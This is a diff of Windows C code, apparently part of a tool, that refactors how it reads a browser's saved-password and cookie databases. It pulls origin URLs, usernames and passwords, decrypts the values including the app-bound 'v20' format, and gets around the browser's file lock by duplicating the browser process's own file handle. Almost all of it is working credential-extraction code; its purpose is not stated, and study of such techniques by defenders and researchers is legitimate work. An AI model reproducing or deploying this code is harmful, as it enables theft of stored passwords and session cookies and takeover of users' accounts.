@@ -4,249 +4,244 @@
 #include <winsqlite/winsqlite3.h>
 #pragma comment(lib, "winsqlite3.lib")
 
-/*** SQLite database access ***/
-
 /* file name query buffer: FILE_NAME_INFORMATION plus a MAX_PATH name */
 #define ABE_NAME_INFO_SIZE  ((ULONG)(sizeof(FILE_NAME_INFORMATION) + MAX_PATH * sizeof(WCHAR)))
 
-/* try: mode=ro&nolock=1 → immutable → DuplicateHandle + deserialize.
-   SQLite opens lazily: lock conflicts surface at prepare time, so each
-   tier must be validated by prepare, not just the open call */
+/*** SQLite database access ***/
+
+/* opens the URI and validates it by preparing the SQL; on failure everything
+   is closed again, the outputs are only written on success */
 static int
-AbeOpenPrepare(
-    _In_z_ PCWSTR DbPath,
+AbeSqliteOpenPrepare(
+    _In_z_ PCSTR Uri,
     _In_z_ PCSTR Sql,
     _Out_ sqlite3** Db,
-    _Out_ sqlite3_stmt** St,
-    _Outptr_opt_result_maybenull_ PBYTE* RawDb)
+    _Out_ sqlite3_stmt** St)
 {
-    static CHAR Uri[MAX_PATH * 3];
-    CHAR Utf8[MAX_PATH * 3];
-    PSTR Out;
-    ULONG i;
+    sqlite3* Db_ = NULL;
+    sqlite3_stmt* St_ = NULL;
     int ResultCode;
 
-    *Db = NULL;
-    *St = NULL;
-    if (RawDb != NULL) *RawDb = NULL;
-    if (Str_W2U(Utf8, DbPath) == 0) return SQLITE_CANTOPEN;
-    Str_PrintfExA(Uri, ARRAYSIZE(Uri), "file:");
-    Out = Uri + strlen(Uri);
-    for (i = 0; i < (ULONG)(Str_SizeA(Utf8) / sizeof(CHAR)); i++)
+    ResultCode = sqlite3_open_v2(Uri, &Db_, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL);
+    if (ResultCode == SQLITE_OK)
     {
-        *Out++ = Utf8[i] == '\\' ? '/' : Utf8[i];
+        ResultCode = sqlite3_prepare_v2(Db_, Sql, -1, &St_, NULL);
     }
-    *Out = 0;
-
-    Str_PrintfExA(Out, ARRAYSIZE(Uri) - (DWORD)(Out - Uri), "?mode=ro&nolock=1");
-    ResultCode = sqlite3_open_v2(Uri, Db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL);
-    if (ResultCode == SQLITE_OK) ResultCode = sqlite3_prepare_v2(*Db, Sql, -1, St, NULL);
     if (ResultCode != SQLITE_OK)
     {
-        if (*St) sqlite3_finalize(*St);
-        if (*Db) sqlite3_close(*Db);
-        *St = NULL;
-        *Db = NULL;
-        Str_PrintfExA(Out, ARRAYSIZE(Uri) - (DWORD)(Out - Uri), "?immutable=1");
-        ResultCode = sqlite3_open_v2(Uri, Db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL);
-        if (ResultCode == SQLITE_OK) ResultCode = sqlite3_prepare_v2(*Db, Sql, -1, St, NULL);
-    }
-
-    /* locked by the running browser: map its own handle and deserialize */
-    if (ResultCode != SQLITE_OK && RawDb != NULL)
-    {
-        NTSTATUS Status;
-        FILE_PROCESS_IDS_USING_FILE_INFORMATION* Owners = NULL;
-        PPROCESS_HANDLE_SNAPSHOT_INFORMATION Handles = NULL;
-        FILE_NAME_INFORMATION* OwnName = NULL;
-        IO_STATUS_BLOCK IoStatusBlock;
-        HANDLE File = NULL, Process = NULL, Dup = NULL;
-        ULONGLONG FileSize;
-        IO_FILE_MAP Map;
-        ULONG Length, Required, RawSize = 0, i2, j;
-        BOOL Found = FALSE;
-
-        if (*St) sqlite3_finalize(*St);
-        if (*Db) sqlite3_close(*Db);
-        *St = NULL;
-        *Db = NULL;
-
-        /* an attributes-only open succeeds even while the browser holds the DB busy */
-        Status = IO_OpenWin32File(&File,
-                                  DbPath,
-                                  NULL,
-                                  FILE_READ_ATTRIBUTES | SYNCHRONIZE,
-                                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
-        if (NT_SUCCESS(Status))
+        if (St_ != NULL)
         {
-            /* our own volume-relative name, used to match the browser's handles */
-            OwnName = Mem_Alloc(ABE_NAME_INFO_SIZE);
-            if (OwnName != NULL)
-            {
-                Status = NtQueryInformationFile(File,
-                                                &IoStatusBlock,
-                                                OwnName,
-                                                ABE_NAME_INFO_SIZE,
-                                                FileNameInformation);
-            } else
-            {
-                Status = STATUS_NO_MEMORY;
-            }
-            if (NT_SUCCESS(Status))
-            {
-                /* who is holding this file? */
-                Length = FIELD_OFFSET(FILE_PROCESS_IDS_USING_FILE_INFORMATION, ProcessIdList) +
-                         16 * sizeof(HANDLE);
-                for (;;)
-                {
-                    Owners = Mem_ReAlloc(Owners, Length);
-                    if (Owners == NULL) break;
-                    Status = NtQueryInformationFile(File,
-                                                    &IoStatusBlock,
-                                                    Owners,
-                                                    Length,
-                                                    FileProcessIdsUsingFileInformation);
-                    if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
-                        Status != STATUS_BUFFER_TOO_SMALL)
-                    {
-                        break;
-                    }
-                    Length *= 2;
-                    if (Length > 1 << 20) break;
-                }
-            }
-            if (Owners != NULL && NT_SUCCESS(Status))
-            {
-                /* duplicate a matching handle from each owner (no system-wide enumeration) */
-                for (i2 = 0; i2 < Owners->NumberOfProcessIdsInList && !Found; i2++)
-                {
-                    if (!NT_SUCCESS(PS_OpenProcess(&Process,
-                                                   PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
-                                                   (ULONG)(ULONG_PTR)Owners->ProcessIdList[i2])))
-                    {
-                        continue;
-                    }
-                    Length = 64 * 1024;
-                    Handles = NULL;
-                    for (;;)
-                    {
-                        Handles = Mem_ReAlloc(Handles, Length);
-                        if (Handles == NULL) break;
-                        Status = NtQueryInformationProcess(Process,
-                                                           ProcessHandleInformation,
-                                                           Handles,
-                                                           Length,
-                                                           &Required);
-                        if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
-                            Status != STATUS_BUFFER_TOO_SMALL)
-                        {
-                            break;
-                        }
-                        Length = max(Length * 2, Required + 4096);
-                        if (Length > 64 * 1024 * 1024) break;
-                    }
-                    if (Handles == NULL || !NT_SUCCESS(Status))
-                    {
-                        Mem_Free(Handles);
-                        Handles = NULL;
-                        NtClose(Process);
-                        Process = NULL;
-                        continue;
-                    }
-
-                    for (j = 0; j < Handles->NumberOfHandles && !Found; j++)
-                    {
-                        FILE_NAME_INFORMATION* Name;
-                        UNICODE_STRING A, B;
-
-                        if (!NT_SUCCESS(NtDuplicateObject(Process,
-                                                          Handles->Handles[j].HandleValue,
-                                                          NtCurrentProcess(),
-                                                          &Dup,
-                                                          0,
-                                                          0,
-                                                          DUPLICATE_SAME_ACCESS)))
-                        {
-                            continue;
-                        }
-                        /* non-file handles fail this query instantly (no hang) */
-                        Name = Mem_Alloc(ABE_NAME_INFO_SIZE);
-                        if (Name != NULL &&
-                            NT_SUCCESS(NtQueryInformationFile(Dup,
-                                                              &IoStatusBlock,
-                                                              Name,
-                                                              ABE_NAME_INFO_SIZE,
-                                                              FileNameInformation)) &&
-                            Name->FileNameLength == OwnName->FileNameLength)
-                        {
-                            A.Length = A.MaximumLength = (USHORT)OwnName->FileNameLength;
-                            A.Buffer = OwnName->FileName;
-                            B.Length = B.MaximumLength = (USHORT)Name->FileNameLength;
-                            B.Buffer = Name->FileName;
-                            if (RtlEqualUnicodeString(&A, &B, TRUE) &&
-                                NT_SUCCESS(IO_GetFileSize(Dup, &FileSize)) &&
-                                FileSize > 0 && FileSize < 64 * 1024 * 1024 &&
-                                NT_SUCCESS(IO_MapReadOnlyFile(Dup, &Map)))
-                            {
-                                *RawDb = Mem_Alloc((SIZE_T)FileSize);
-                                if (*RawDb != NULL)
-                                {
-                                    RtlCopyMemory(*RawDb, Map.BaseAddress, (SIZE_T)FileSize);
-                                    RawSize = (ULONG)FileSize;
-                                    Found = TRUE;
-                                }
-                                IO_UnmapFile(&Map);
-                            }
-                        }
-                        Mem_Free(Name);
-                        NtClose(Dup);
-                        Dup = NULL;
-                    }
-                    Mem_Free(Handles);
-                    Handles = NULL;
-                    NtClose(Process);
-                    Process = NULL;
-                }
-            }
-
-            if (Found)
-            {
-                ResultCode = sqlite3_open_v2(":memory:", Db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, NULL);
-                if (ResultCode == SQLITE_OK)
-                {
-                    ResultCode = sqlite3_deserialize(*Db,
-                                                     "main",
-                                                     *RawDb,
-                                                     (sqlite3_int64)RawSize,
-                                                     (sqlite3_int64)RawSize,
-                                                     SQLITE_DESERIALIZE_READONLY);
-                    if (ResultCode == SQLITE_OK) ResultCode = sqlite3_prepare_v2(*Db, Sql, -1, St, NULL);
-                }
-                if (ResultCode != SQLITE_OK)
-                {
-                    if (*St) sqlite3_finalize(*St);
-                    *St = NULL;
-                    sqlite3_close(*Db);
-                    *Db = NULL;
-                    Mem_Free((PVOID)*RawDb);
-                    *RawDb = NULL;
-                }
-            }
-
-            Mem_Free(Owners);
+            sqlite3_finalize(St_);
         }
-        Mem_Free(OwnName);
-        if (File != NULL) NtClose(File);
-        if (Dup != NULL) NtClose(Dup);
-        if (Process != NULL) NtClose(Process);
-        Mem_Free(Handles);
+        if (Db_ != NULL)
+        {
+            sqlite3_close(Db_);
+        }
+        return ResultCode;
     }
-    return ResultCode;
+    *Db = Db_;
+    *St = St_;
+    return SQLITE_OK;
+}
+
+/* locked by the running browser: map its own handle into a private buffer */
+static NTSTATUS
+AbeReadLockedDatabase(
+    _In_z_ PCWSTR DbPath,
+    _Outptr_result_bytebuffer_(*RawSize) PBYTE* RawDb,
+    _Out_ PULONG RawSize)
+{
+    FILE_PROCESS_IDS_USING_FILE_INFORMATION* Owners = NULL;
+    PPROCESS_HANDLE_SNAPSHOT_INFORMATION Handles = NULL;
+    FILE_NAME_INFORMATION* OwnName = NULL;
+    IO_STATUS_BLOCK IoStatusBlock;
+    HANDLE File = NULL, Process = NULL, Dup = NULL;
+    ULONGLONG FileSize;
+    IO_FILE_MAP Map;
+    ULONG Length, Required, i, j;
+    NTSTATUS Status;
+    BOOL Found = FALSE;
+
+    *RawDb = NULL;
+    *RawSize = 0;
+
+    /* an attributes-only open succeeds even while the browser holds the DB busy */
+    Status = IO_OpenWin32File(&File,
+                              DbPath,
+                              NULL,
+                              FILE_READ_ATTRIBUTES | SYNCHRONIZE,
+                              FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
+    if (!NT_SUCCESS(Status))
+    {
+        return Status;
+    }
+
+    /* our own volume-relative name, used to match the browser's handles */
+    OwnName = Mem_Alloc(ABE_NAME_INFO_SIZE);
+    if (OwnName == NULL)
+    {
+        Status = STATUS_NO_MEMORY;
+        goto _Exit;
+    }
+    Status = NtQueryInformationFile(File,
+                                    &IoStatusBlock,
+                                    OwnName,
+                                    ABE_NAME_INFO_SIZE,
+                                    FileNameInformation);
+    if (!NT_SUCCESS(Status))
+    {
+        goto _Exit;
+    }
+
+    /* who is holding this file? */
+    Length = FIELD_OFFSET(FILE_PROCESS_IDS_USING_FILE_INFORMATION, ProcessIdList) +
+             16 * sizeof(HANDLE);
+    for (;;)
+    {
+        Owners = Mem_ReAlloc(Owners, Length);
+        if (Owners == NULL)
+        {
+            Status = STATUS_NO_MEMORY;
+            goto _Exit;
+        }
+        Status = NtQueryInformationFile(File,
+                                        &IoStatusBlock,
+                                        Owners,
+                                        Length,
+                                        FileProcessIdsUsingFileInformation);
+        if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
+            Status != STATUS_BUFFER_TOO_SMALL)
+        {
+            break;
+        }
+        Length *= 2;
+        if (Length > 1 << 20)
+        {
+            Status = STATUS_BUFFER_TOO_SMALL;
+            goto _Exit;
+        }
+    }
+    if (!NT_SUCCESS(Status))
+    {
+        goto _Exit;
+    }
+
+    /* duplicate a matching handle from each owner (no system-wide enumeration) */
+    for (i = 0; i < Owners->NumberOfProcessIdsInList && !Found; i++)
+    {
+        if (!NT_SUCCESS(PS_OpenProcess(&Process,
+                                       PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
+                                       (ULONG)(ULONG_PTR)Owners->ProcessIdList[i])))
+        {
+            continue;
+        }
+        Length = 64 * 1024;
+        Handles = NULL;
+        for (;;)
+        {
+            Handles = Mem_ReAlloc(Handles, Length);
+            if (Handles == NULL)
+            {
+                break;
+            }
+            Status = NtQueryInformationProcess(Process,
+                                               ProcessHandleInformation,
+                                               Handles,
+                                               Length,
+                                               &Required);
+            if (Status != STATUS_INFO_LENGTH_MISMATCH && Status != STATUS_BUFFER_OVERFLOW &&
+                Status != STATUS_BUFFER_TOO_SMALL)
+            {
+                break;
+            }
+            Length = max(Length * 2, Required + 4096);
+            if (Length > 64 * 1024 * 1024)
+            {
+                break;
+            }
+        }
+        if (Handles == NULL || !NT_SUCCESS(Status))
+        {
+            goto _NextOwner;
+        }
+
+        for (j = 0; j < Handles->NumberOfHandles && !Found; j++)
+        {
+            FILE_NAME_INFORMATION* Name;
+            UNICODE_STRING A, B;
+
+            if (!NT_SUCCESS(NtDuplicateObject(Process,
+                                              Handles->Handles[j].HandleValue,
+                                              NtCurrentProcess(),
+                                              &Dup,
+                                              0,
+                                              0,
+                                              DUPLICATE_SAME_ACCESS)))
+            {
+                continue;
+            }
+            /* non-file handles fail this query instantly (no hang) */
+            Name = Mem_Alloc(ABE_NAME_INFO_SIZE);
+            if (Name != NULL &&
+                NT_SUCCESS(NtQueryInformationFile(Dup,
+                                                  &IoStatusBlock,
+                                                  Name,
+                                                  ABE_NAME_INFO_SIZE,
+                                                  FileNameInformation)) &&
+                Name->FileNameLength == OwnName->FileNameLength)
+            {
+                A.Length = A.MaximumLength = (USHORT)OwnName->FileNameLength;
+                A.Buffer = OwnName->FileName;
+                B.Length = B.MaximumLength = (USHORT)Name->FileNameLength;
+                B.Buffer = Name->FileName;
+                if (RtlEqualUnicodeString(&A, &B, TRUE) &&
+                    NT_SUCCESS(IO_GetFileSize(Dup, &FileSize)) &&
+                    FileSize > 0 && FileSize < 64 * 1024 * 1024 &&
+                    NT_SUCCESS(IO_MapReadOnlyFile(Dup, &Map)))
+                {
+                    *RawDb = Mem_Alloc((SIZE_T)FileSize);
+                    if (*RawDb != NULL)
+                    {
+                        RtlCopyMemory(*RawDb, Map.BaseAddress, (SIZE_T)FileSize);
+                        *RawSize = (ULONG)FileSize;
+                        Found = TRUE;
+                    }
+                    IO_UnmapFile(&Map);
+                }
+            }
+            Mem_Free(Name);
+            NtClose(Dup);
+            Dup = NULL;
+        }
+
+_NextOwner:
+        Mem_Free(Handles);
+        Handles = NULL;
+        NtClose(Process);
+        Process = NULL;
+    }
+    Status = Found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
+
+_Exit:
+    if (Dup != NULL)
+    {
+        NtClose(Dup);
+    }
+    if (Process != NULL)
+    {
+        NtClose(Process);
+    }
+    Mem_Free(Handles);
+    Mem_Free(Owners);
+    Mem_Free(OwnName);
+    NtClose(File);
+    return Status;
 }
 
 /*** record collection ***/
 
-static BOOL
+/* appends a zeroed record and returns it, or NULL when out of memory */
+static PABE_RECORD
 AbeAppendRecord(
     _Inout_ PABE_RECORD* Array,
     _Inout_ PULONG Count,
@@ -258,12 +253,15 @@ AbeAppendRecord(
 
         *Capacity = *Capacity != 0 ? *Capacity * 2 : 64;
         NewArray = Mem_ReAlloc(*Array, *Capacity * sizeof(**Array));
-        if (NewArray == NULL) return FALSE;
+        if (NewArray == NULL)
+        {
+            return NULL;
+        }
         *Array = NewArray;
     }
     RtlZeroMemory(&(*Array)[*Count], sizeof(**Array));
     (*Count)++;
-    return TRUE;
+    return &(*Array)[*Count - 1];
 }
 
 /* TRUE when an identical record was already collected from another database */
@@ -306,11 +304,12 @@ AbeCollectRecords(
         "SELECT origin_url,username_value,password_value FROM logins";
     PABE_RECORD* Records = IsCookie ? &Result->Cookies : &Result->Passwords;
     PULONG RecordCount = IsCookie ? &Result->CookieCount : &Result->PasswordCount;
-    ULONG Capacity = 0;
+    PULONG Capacity = IsCookie ? &Result->CookieCapacity : &Result->PasswordCapacity;
     WCHAR DbPath[MAX_PATH];
     sqlite3* Db = NULL;
     sqlite3_stmt* St = NULL;
     PBYTE RawDb = NULL;
+    ULONG RawSize = 0;
     static BYTE Plain[4096];
     const BYTE* Blob;
     const char *Site, *Name;
@@ -336,11 +335,65 @@ AbeCollectRecords(
         }
     }
 
-    ResultCode = AbeOpenPrepare(DbPath,
-                                IsCookie ? CookieSql : PasswordSql,
-                                &Db,
-                                &St,
-                                &RawDb);
+    /* try: mode=ro&nolock=1 → immutable → duplicate the owner's handle + deserialize.
+       SQLite opens lazily: lock conflicts surface at prepare time, so each
+       tier must be validated by prepare, not just the open call */
+    {
+        static CHAR Uri[MAX_PATH * 3];
+        CHAR Utf8[MAX_PATH * 3];
+        PCSTR Sql = IsCookie ? CookieSql : PasswordSql;
+        PSTR Query;
+        ULONG i;
+
+        if (Str_W2U(Utf8, DbPath) == 0)
+        {
+            AbeLog(L"%hs: database unavailable (path)\r\n", DbFile);
+            return;
+        }
+        Str_PrintfExA(Uri, ARRAYSIZE(Uri), "file:");
+        Query = Uri + strlen(Uri);
+        for (i = 0; i < (ULONG)(Str_SizeA(Utf8) / sizeof(CHAR)); i++)
+        {
+            *Query++ = Utf8[i] == '\\' ? '/' : Utf8[i];
+        }
+        *Query = 0;
+
+        Str_PrintfExA(Query, ARRAYSIZE(Uri) - (ULONG)(Query - Uri), "?mode=ro&nolock=1");
+        ResultCode = AbeSqliteOpenPrepare(Uri, Sql, &Db, &St);
+        if (ResultCode != SQLITE_OK)
+        {
+            Str_PrintfExA(Query, ARRAYSIZE(Uri) - (ULONG)(Query - Uri), "?immutable=1");
+            ResultCode = AbeSqliteOpenPrepare(Uri, Sql, &Db, &St);
+        }
+        if (ResultCode != SQLITE_OK && NT_SUCCESS(AbeReadLockedDatabase(DbPath, &RawDb, &RawSize)))
+        {
+            ResultCode = sqlite3_open_v2(":memory:", &Db, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, NULL);
+            if (ResultCode == SQLITE_OK)
+            {
+                ResultCode = sqlite3_deserialize(Db,
+                                                 "main",
+                                                 RawDb,
+                                                 (sqlite3_int64)RawSize,
+                                                 (sqlite3_int64)RawSize,
+                                                 SQLITE_DESERIALIZE_READONLY);
+                if (ResultCode == SQLITE_OK)
+                {
+                    ResultCode = sqlite3_prepare_v2(Db, Sql, -1, &St, NULL);
+                }
+            }
+            if (ResultCode != SQLITE_OK)
+            {
+                if (St != NULL)
+                {
+                    sqlite3_finalize(St);
+                }
+                sqlite3_close(Db);
+                Db = NULL;
+                Mem_Free(RawDb);
+                RawDb = NULL;
+            }
+        }
+    }
     if (ResultCode != SQLITE_OK || St == NULL)
     {
         AbeLog(L"%hs: database unavailable (%d)\r\n", DbFile, ResultCode);
@@ -374,17 +427,21 @@ AbeCollectRecords(
         }
 
         /* append the record even on failure: the entry itself stays visible */
-        if (!AbeAppendRecord(Records, RecordCount, &Capacity)) break;
-        Record = &(*Records)[*RecordCount - 1];
-        if (Ver == NULL) Ver = "v????";
+        Record = AbeAppendRecord(Records, RecordCount, Capacity);
+        if (Record == NULL)
+        {
+            break;
+        }
+        if (Ver == NULL)
+        {
+            Ver = "v????";
+        }
         if (Str_EqualA(Ver, "v20") && V20EnvelopeVersion != 0)
         {
             Str_PrintfA(Version, "v20-v%lu", V20EnvelopeVersion);
-            Str_A2W(Record->Version, Version);
-        } else
-        {
-            Str_A2W(Record->Version, Ver);
+            Ver = Version;
         }
+        Str_A2W(Record->Version, Ver);
         Str_U2W(Record->Site, Site != NULL ? Site : "");
         Str_U2W(Record->Name, Name != NULL ? Name : "");
 
@@ -408,11 +465,16 @@ AbeCollectRecords(
         /* cookie values since schema 24 carry SHA256(host_key) in front */
         Skip = IsCookie && Length > 3 + 12 + 16 + 32 ? 32 : 0;
         PlainLength = Length - 3 - 12 - 16 - Skip;
-        RtlUTF8ToUnicodeN(Record->Value,
-                          sizeof(Record->Value) - sizeof(UNICODE_NULL),
-                          &Translated,
-                          (PCCH)Plain + Skip,
-                          PlainLength);
+        Status = RtlUTF8ToUnicodeN(Record->Value,
+                                   sizeof(Record->Value) - sizeof(UNICODE_NULL),
+                                   &Translated,
+                                   (PCCH)Plain + Skip,
+                                   PlainLength);
+        if (!NT_SUCCESS(Status) && Status != STATUS_BUFFER_OVERFLOW)
+        {
+            Str_PrintfW(Record->Value, L"Decrypt failed: 0x%08lX", Status);
+            continue;
+        }
         if (Translated > sizeof(Record->Value) - sizeof(UNICODE_NULL))
         {
             Translated = sizeof(Record->Value) - sizeof(UNICODE_NULL);
